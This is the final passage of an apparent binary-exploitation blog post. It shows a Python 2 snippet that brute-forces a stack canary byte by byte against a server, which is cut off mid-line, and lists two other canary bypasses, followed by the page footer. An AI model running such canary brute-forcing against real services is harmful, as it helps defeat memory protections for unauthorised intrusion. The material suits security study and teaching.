<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="k">print</span> <span class="s2">&#34;[+] Brute forcing stack canary &#34;</span>
  
  <span class="n">start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
  <span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span>
  
  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">send2server</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
  
        <span class="k">if</span> <span class="n">res</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
           <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
           <span class="c1">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
           <span class="k">break</span>
  
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">255</span><span class="p">:</span>
           <span class="k">print</span> <span class="s2">&#34;[-] Exploit failed&#34;</span>
           <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
  
  
  <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
  <span class="k">print</span> <span class="s2">&#34;   [+] SSP value is 0x</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> </code></pre></div>
<ul>
<li><p>canary劫持__stack_chk_fail 函数</p></li>

<li><p>覆盖 TLS 中储存的 Canary 值</p></li>
</ul>


        </div>
        <footer>
            <hr>
            
        <div id="disqus_thread"></div>
<script>





(function() { 
var d = document, s = d.createElement('script');
s.src = 'https://vorblock.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
        <script id="dsq-count-scr" src="//vorblock.disqus.com/count.js" async></script>
    <script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>

    
    <script>
        (function(){function center_el(tagName){var tags=document.getElementsByTagName(tagName),i,tag;for(i=0;i<tags.length;i++){tag=tags[i];var parent=tag.parentElement;if(parent.childNodes.length===1){if(parent.nodeName==='A'){parent=parent.parentElement;if(parent.childNodes.length!=1)continue;parent.firstChild.style.border='none';}
if(parent.nodeName==='P')parent.style.textAlign='center';}}}
var tagNames=['img','embed','object'];for(var i=0;i<tagNames.length;i++){center_el(tagNames[i]);}})();
    </script>
    
            <div class="copyright">
                <span class="copyright">&copy;2017-2019 vorblock - <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></span>
            </div>
        </footer>
    </article>
</body>

</html>